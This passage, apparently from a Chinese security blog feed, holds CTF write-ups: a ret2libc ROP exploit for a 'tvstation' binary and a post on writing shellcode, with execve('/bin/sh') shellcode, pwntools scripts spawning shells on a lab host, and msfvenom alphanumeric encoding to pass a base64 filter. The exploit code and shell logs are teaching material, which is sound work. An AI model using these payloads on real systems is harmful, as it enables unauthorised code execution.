debug_func(<span class="hljs-number">1LL</span>, fmsg);<br>&#125;<br></code></pre></td></tr></table></figure><p>此函数会直接泄露<code>system()</code>在此程序中加载的位置</p><p><code>system()</code>在<code>libc</code>的偏移量为<code>00000000000456A0</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000000456</span>A0 ; =============== S U B R O U T I N E =======================================<br>.text:<span class="hljs-number">00000000000456</span>A0<br>.text:<span class="hljs-number">00000000000456</span>A0<br>.text:<span class="hljs-number">00000000000456</span>A0                 public system ; weak<br>.text:<span class="hljs-number">00000000000456</span>A0 system          proc near               ; DATA XREF: LOAD:<span class="hljs-number">0000000000007438</span>↑o<br>.text:<span class="hljs-number">00000000000456</span>A0                                         ; LOAD:<span class="hljs-number">000000000000B</span>C68↑o<br>.text:<span class="hljs-number">00000000000456</span>A0 ; __unwind &#123;<br>.text:<span class="hljs-number">00000000000456</span>A0                 test    rdi, rdi<br>.text:<span class="hljs-number">00000000000456</span>A3                 jz      <span class="hljs-type">short</span> loc_456B0<br>.text:<span class="hljs-number">00000000000456</span>A5                 jmp     sub_45130<br></code></pre></td></tr></table></figure><p><code>/bin/sh</code>的偏移地址<code>000000000018AC40</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">000000000018</span>AC40 aBinSh          db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span>          ; DATA XREF: sub_45130+<span class="hljs-number">451</span>↑o<br>.rodata:<span class="hljs-number">000000000018</span>AC40                                         ; _IO_proc_open+<span class="hljs-number">2F</span>9↑o ...<br></code></pre></td></tr></table></figure><p>有了<code>system()</code>和<code>/bin/sh</code>的偏移地址后我们需要一个<code>gadget</code>来给<code>system()</code>传参：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali ROPgadget --binary tvstation | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br>0x0000000000400c13 : pop rdi ; ret<br></code></pre></td></tr></table></figure><p>因此可以构造脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:&quot;utf-8&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&#x27;./tvstation&#x27;</span>)<br><span class="hljs-comment">#elf=ELF(&#x27;./libc.so.6_x64&#x27;)</span><br><br>io.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment">#跳转到debug()</span><br>io.recvuntil(<span class="hljs-string">&quot;@0x&quot;</span>)<br>system_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<span class="hljs-comment">#读取输出的system函数在内存中的地址</span><br>libc_start = system_addr - <span class="hljs-number">0x456a0</span><span class="hljs-comment">#根据偏移计算libc在内存中的首地址</span><br>pop_rdi_addr = <span class="hljs-number">0x400c13</span><span class="hljs-comment">#pop rdi; ret 在内存中的地址，给system函数传参</span><br>binsh_addr = libc_start + <span class="hljs-number">0x18AC40</span><span class="hljs-comment">#&quot;/bin/sh&quot;字符串在内存中的地址</span><br><br>payload = <span class="hljs-string">&quot;&quot;</span><br>payload += <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">40</span><span class="hljs-comment">#padding</span><br>payload += p64(pop_rdi_addr)<span class="hljs-comment">#pop rdi; ret</span><br>payload += p64(binsh_addr)<span class="hljs-comment">#system函数参数</span><br>payload += p64(system_addr)<span class="hljs-comment">#调用system()执行system(&quot;/bin/sh&quot;)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="⌛待更新…"><a href="#⌛待更新…" class="headerlink" title="⌛待更新…"></a>⌛待更新…</h3>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode的编写和利用</title>
    <link href="/2018/10/Shell-code%E7%9A%84%E7%BC%96%E5%86%99%E5%92%8C%E5%88%A9%E7%94%A8/"/>
    <url>/2018/10/Shell-code%E7%9A%84%E7%BC%96%E5%86%99%E5%92%8C%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>在渗透测试和漏洞利用中，<code>Shellcode</code>是一个十分重要的部分，在二进制的安全研究中，<code>Shellcode</code>也充当着十分重要的角色，本文会记录我学习<code>Shellcode</code>的编写和利用原理。</p><h2 id="在程序中嵌入Shellcode并执行"><a href="#在程序中嵌入Shellcode并执行" class="headerlink" title="在程序中嵌入Shellcode并执行"></a>在程序中嵌入Shellcode并执行</h2><p>首先拿一道十分简单的PWN题来演示程序是如何执行<code>Shellcode</code>的</p><p><a href="">文件下载</a></p><p>首先，这是一个<code>32</code>位的程序，我把它放到了<code>32</code>位的<code>kali</code>虚拟机中</p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ checksec<br>CANARY    : ENABLED<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br></code></pre></td></tr></table></figure><p>程序开启了<code>NX</code>和<code>CANARY</code>，实际上并没有检查此程序开启的安全措施的必要，因为分析<code>IDA</code>中的伪C代码可知，此程序会将用户输入的数据当作汇编代码进行执行，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// ST2C_4</span><br>  <span class="hljs-type">void</span> *v4; <span class="hljs-comment">// ST30_4</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ST38_4</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+3Ch] [ebp-84h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+BCh] [ebp-4h]</span><br><br>  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  v3 = open(<span class="hljs-string">&quot;/home/challenge/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  setbuf(_bss_start, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  alarm(<span class="hljs-number">0x1E</span>u);<br>  v4 = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(v4, <span class="hljs-number">195</span>, <span class="hljs-number">0x7F</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x7F</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OpenCTF tyro shellcode challenge.\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write me some shellcode that reads from the file_descriptor&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I supply and writes it to the buffer that I supply&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d ... 0x%08x\n&quot;</span>, v3, &amp;s);<br>  read(<span class="hljs-number">0</span>, v4, <span class="hljs-number">0x20</span>u);<br>  v5 = ((<span class="hljs-type">int</span> (*)(<span class="hljs-type">void</span>))v4)();<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过分析汇编代码可知程序会使用<code>call eax</code>的方式来运行用户的输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048721</span>                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;%d ... 0x%08x\n&quot;</span><br>.text:<span class="hljs-number">08048728</span>                 call    _printf<br>.text:<span class="hljs-number">0804872</span>D                 mov     dword ptr [esp+<span class="hljs-number">8</span>], <span class="hljs-number">20</span>h ; nbytes<br>.text:<span class="hljs-number">08048735</span>                 mov     eax, [esp+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">08048739</span>                 mov     [esp+<span class="hljs-number">4</span>], eax    ; buf<br>.text:<span class="hljs-number">0804873</span>D                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; fd<br>.text:<span class="hljs-number">08048744</span>                 call    _read<br>.text:<span class="hljs-number">08048749</span>                 mov     eax, [esp+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">0804874</span>D                 mov     [esp+<span class="hljs-number">34</span>h], eax<br>.text:<span class="hljs-number">08048751</span>                 mov     eax, [esp+<span class="hljs-number">34</span>h]<br>.text:<span class="hljs-number">08048755</span>                 call    eax         &lt;================== Here<br>.text:<span class="hljs-number">08048757</span>                 mov     [esp+<span class="hljs-number">38</span>h], eax<br>.text:<span class="hljs-number">0804875B</span>                 lea     eax, [esp+<span class="hljs-number">0</span>C0h+s]<br>.text:<span class="hljs-number">0804875F</span>                 mov     [esp], eax      ; s<br></code></pre></td></tr></table></figure><p>因此我们可以吧要执行的汇编代码通过<code>pwntools</code>来输入到此程序中达到执行的目的，这里我们要输入的一些能达到某种执行效果的汇编代码即为<code>shellcode</code>，这里有一个网站，上面有很多经典又实用的<code>shellcode</code>，<a href="http://shell-storm.org/">shell-storm.org</a>，网站的维护者同时是<code>ROPgadget</code>的作者，话不多说，膜就完事了。</p><p>Jonathan Salwan</p><p><img src="https://i.loli.net/2018/10/30/5bd80353472e6.png"></p><p>本程序为用户的输入开启了<code>read(0, v4, 0x20u);</code>即32个字节的空间，因此我们可以在<a href="http://shell-storm.org/shellcode/files/shellcode-841.php">这个网站</a>上找到一个长度满足要求的shellcode以填充我们的输入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = \<br><br><span class="hljs-string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f&quot;</span><br><span class="hljs-string">&quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd&quot;</span><br><span class="hljs-string">&quot;\x80&quot;</span>;<br><br>main ()<br>&#123;<br><br>    <span class="hljs-comment">// When contains null bytes, printf will show a wrong shellcode length.</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length:  %d\n&quot;</span>, <span class="hljs-built_in">strlen</span>(shellcode));<br><br><span class="hljs-comment">// Pollutes all registers ensuring that the shellcode runs in any circumstance.</span><br><br>__asm__ (<span class="hljs-string">&quot;movl $0xffffffff, %eax\n\t&quot;</span><br>  <span class="hljs-string">&quot;movl %eax, %ebx\n\t&quot;</span><br> <span class="hljs-string">&quot;movl %eax, %ecx\n\t&quot;</span><br> <span class="hljs-string">&quot;movl %eax, %edx\n\t&quot;</span><br> <span class="hljs-string">&quot;movl %eax, %esi\n\t&quot;</span><br> <span class="hljs-string">&quot;movl %eax, %edi\n\t&quot;</span><br> <span class="hljs-string">&quot;movl %eax, %ebp\n\t&quot;</span><br> <span class="hljs-comment">// Calling the shellcode</span><br> <span class="hljs-string">&quot;call shellcode&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shellcode</code>为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<br></code></pre></td></tr></table></figure><p>我们可以直接使用<code>pwntools</code>攻击一下此程序，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;192.168.229.140&#x27;</span>,<span class="hljs-number">10001</span>)<br>shellcode=<span class="hljs-string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span><br><span class="hljs-built_in">print</span> io.recv()<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>运行程序即可执行<code>/bin/sh</code>进行远程交互，为了搞清楚这一段shellcode做了什么，我们需要将这一段shell code转换为汇编代码，将shellcode转换为汇编的方式有很多种，我这里使用的方法是用Ollydbg转换，首先，随便用OD打开一个二进制文件，随后复制shellcode的内容，再随意选中OD中汇编框中长度足够的区域，点击右键，选择二进制粘贴，把shellcode粘贴到文件中：</p><p><img src="https://i.loli.net/2018/10/30/5bd8184c49fd2.png"></p><p>此时OD会自动把shellcode对应的数据转化为汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">31C9            xor ecx,ecx<br>F7E1            mul ecx<br>B0 0B           mov al,0xB<br>51              push ecx<br>68 2F2F7368     push 0x68732F2F<br>68 2F62696E     push 0x6E69622F<br>89E3            mov ebx,esp<br>CD 80           int 0x80<br></code></pre></td></tr></table></figure><p>可见，这一段<code>shell code</code>调用了系统软中断，相关的详细信息在我之前的博文中有介绍：<a href="https://hvnt3r.top/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8BROP/#%E6%97%A0system%E5%87%BD%E6%95%B0%E6%97%B6%E8%B0%83%E7%94%A8int-0x80%E5%AE%8C%E6%88%90ROP">通过int 80h执行系统命令</a>，这段<code>shellcode</code>就是设置好了调用系统函数的参数并调用的。</p><h2 id="Shellcode变形"><a href="#Shellcode变形" class="headerlink" title="Shellcode变形"></a>Shellcode变形</h2><p>当然百分之99的情况下程序并不会像上面那个例子直接执行用户所给的代码，在<code>BSides San Francisco CTF 2017</code>的<code>b_64_b_tuff</code>中</p><p><a href="">文件下载</a></p><p>用IDA查看主要的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// ST2C_4</span><br>  <span class="hljs-type">void</span> *v5; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span><br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">ssize_t</span> v7; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br><br>  alarm(<span class="hljs-number">0xA</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v5 = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x41410000</span>, <span class="hljs-number">0x1558</span>u, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address of buffer start: %p\n&quot;</span>, v5);<br>  buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>u);<br>  v7 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x1000</span>u);<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error reading!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Read %zd bytes!\n&quot;</span>, v7);<br>  s = (<span class="hljs-type">char</span> *)base64_encode((<span class="hljs-type">int</span>)buf, v7, v5);<br>  <span class="hljs-built_in">puts</span>(s);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))v5)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟上一个例子类似，程序会将用户输入的代码执行，不过区别在于程序会先把用户输入的数据进行<code>base64</code>解码，那么问题来了，进行<code>base64</code>加密的时候只支持<code>英文字母的大小写</code>和<code>+/</code>，但是在<code>shellcode</code>中有很多不可打印的字符，因此我们需要对<code>shellcode</code>进行一定的处理使得<code>shellcode</code>被<code>base64</code>解码后能正常的执行。</p><p>是时候祭出大杀器<code>msfvenom</code>了，<code>msfvenom</code>是kali下的一款神器，有很多好玩有趣的功能，感兴趣可以自己谷歌一下玩法，但是<code>msfvenom</code>只支持stdin的方式传参，因此我们用<code>python</code>加上管道操作向<code>msfvenom</code>传参，我们选用<code>x86/alpha_mixed</code>这个过滤器来生成只有大小写字母的<code>shellcode</code>，因为程序中是使用<code>call eax</code>调用<code>shellcode</code>的，因此我们需要将<code>BufferRegister</code>设置为<code>EAX</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048891</span>                 call    _puts<br>.text:<span class="hljs-number">08048896</span>                 add     esp, <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">08048899</span>                 mov     eax, [ebp+var_18]<br>.text:<span class="hljs-number">0804889</span>C                 call    eax     &lt;=========== call shellcode<br>.text:<span class="hljs-number">0804889</span>E                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">080488</span>A3                 mov     ecx, [ebp+var_4]<br>.text:<span class="hljs-number">080488</span>A6                 leave<br></code></pre></td></tr></table></figure><p>生成<code>payload</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali  python -c <span class="hljs-string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;)&#x27;</span> | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload<br>Attempting to <span class="hljs-built_in">read</span> payload from STDIN...<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/alpha_mixed<br>x86/alpha_mixed succeeded with size 96 (iteration=0)<br>x86/alpha_mixed chosen with final size 96<br>Payload size: 96 bytes<br>Saved as: payload<br> ⚡ root@kali  l<br>总用量 24K<br>drwxr-xr-x 2 root root 4.0K 10月 30 06:45 .<br>drwxr-xr-x 8 root root 4.0K 10月 18 03:25 ..<br>-rwxr-xr-x 1 root root 7.7K 1月  30  2018 b-64-b-tuff<br>-rw-r--r-- 1 root root  502 2月   1  2018 exp.py<br>-rw-r--r-- 1 root root   96 10月 30 06:45 payload<br> ⚡ root@kali  <span class="hljs-built_in">cat</span> payload <br>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9ygYqH0fk61CXVOtoD3rHaxto52pibNMYYsjmK0AA<span class="hljs-comment">#                                  </span><br></code></pre></td></tr></table></figure><p>得到改造过的<code>shellcode</code>之后我们就可以通过脚本向程序传递<code>shellcode</code>了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;192.168.229.140&#x27;</span>,<span class="hljs-number">10001</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=b64decode(<span class="hljs-string">&#x27;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9ygYqH0fk61CXVOtoD3rHaxto52pibNMYYsjmK0AA&#x27;</span>)<br><span class="hljs-built_in">print</span> io.recv()<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali  python 1.py<br>[+] Opening connection to 192.168.229.140 on port 10001: Done<br>[DEBUG] Received 0x24 bytes:<br>    <span class="hljs-string">&#x27;Address of buffer start: 0x41410000\n&#x27;</span><br>Address of buffer start: 0x41410000<br><br>[DEBUG] Sent 0x49 bytes:<br>    00000000  3d 82 08 20  82 08 20 82  08 20 82 08  20 8e d0 66  │=·· │·· ·│· ··│ ··f│<br>    00000010  30 17 3f 40  34 02 40 00  43 60 01 d8  10 74 04 10  │0·?@│4·@·│C`··│·t··│<br>    00000020  01 5c ff 00  06 e2 48 d3  5a 3d ca 06  2a 1f 47 e4  │·\··│··H·│Z=··│*·G·│<br>    00000030  eb 50 97 54  eb 68 0f 7a  c7 6b 1b 68  e7 6a 62 6c  │·P·T│·h·z│·k·h│·jbl│<br>    00000040  d3 18 62 c8  e6 2b 40 00  0a                        │··b·│·+@·│·│<br>    00000049<br>[*] Switching to interactive mode<br>[DEBUG] Received 0x5e bytes:<br>    00000000  3d 82 5e 48  20 82 5e 48  20 82 5e 48  20 82 5e 48  │=·^H│ ·^H│ ·^H│ ·^H│<br>    00000010  20 8e d0 66  30 5e 57 3f  40 34 5e 42  40 5e 40 43  │ ··f│0^W?│@4^B│@^@C│<br>    00000020  60 5e 41 d8  5e 50 74 5e  44 5e 50 5e  41 5c ff 5e  │`^A·│^Pt^│D^P^│A\·^│<br>    00000030  40 5e 46 e2  48 d3 5a 3d  ca 5e 46 2a  5e 5f 47 e4  │@^F·│H·Z=│·^F*│^_G·│<br>    00000040  eb 50 97 54  eb 68 5e 4f  7a c7 6b 5e  5b 68 e7 6a  │·P·T│·h^O│z·k^│[h·j│<br>    00000050  62 6c d3 5e  58 62 c8 e6  2b 40 5e 40  5e 4a        │bl·^│Xb··│+@^@│^J│<br>    0000005e<br>=\x82^H \x82^H \x82^H \x82^H \x8e�f0^W?@4^B@^@C`^A�^Pt^D^P^A\\xff^@^F�H�Z=�^F*^_G��P\x97T�h^Oz�k^[h�j[DEBUG] Received 0x74 bytes:<br>    <span class="hljs-string">&#x27;Read 73 bytes!\n&#x27;</span><br>    <span class="hljs-string">&#x27;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9ygYqH0fk61CXVOtoD3rHaxto52pibNMYYsjmK0AACg==\n&#x27;</span><br>Read 73 bytes!<br>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9ygYqH0fk61CXVOtoD3rHaxto52pibNMYYsjmK0AACg==<br>$ <span class="hljs-built_in">ls</span><br>[DEBUG] Sent 0x3 bytes:<br>    <span class="hljs-string">&#x27;ls\n&#x27;</span><br>[DEBUG] Received 0x4 bytes:<br>    <span class="hljs-string">&#x27;ls^J&#x27;</span><br><span class="hljs-built_in">ls</span>^J[DEBUG] Received 0x14 bytes:<br>    <span class="hljs-string">&#x27;b-64-b-tuff  exp.py\n&#x27;</span><br>b-64-b-tuff  exp.py<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$ <br>[*] Interrupted<br>[*] Closed connection to 192.168.229.140 port 10001<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
